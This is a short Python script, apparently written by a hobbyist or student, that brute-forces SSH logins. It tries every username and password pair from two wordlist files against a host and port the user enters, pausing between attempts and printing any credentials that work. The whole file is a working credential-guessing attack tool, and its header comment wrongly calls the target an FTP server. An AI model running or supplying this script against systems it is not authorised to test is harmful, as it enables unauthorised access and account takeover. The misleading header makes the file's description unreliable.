#Kyle Pendleton
#11/11/2024
#This script will attempt to bruteforce access to a specified ftp server

import paramiko
import socket
import time

def brute_force_ssh(domain,domain_port,usernames,passwords):
    logging = paramiko.util.log_to_file('log.log')
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        print('Testing credentials {}:{}'.format(usernames,passwords))
        client.connect(domain,port=domain_port,username=usernames,password=passwords, timeout=5)
        print('credentials ok {}:{}'.format(usernames,passwords))
    except paramiko.AuthenticationException as exception:
        print('AuthenticationException:',exception)
    except socket.error as error:
        print('SocketError:',error)


def main():
    domain = input("Enter the target hostname: ")
    domain_port = input("Enter the target port: ")
    usernames = open('ssh_users.txt','r').readlines()
    user_passwords = open('ssh_passwords.txt','r').readlines()

    for user in usernames:
        for password in user_passwords:
            time.sleep(3)
            brute_force_ssh(domain,domain_port,user.rstrip(),password.rstrip())


if __name__ == '__main__':
    main()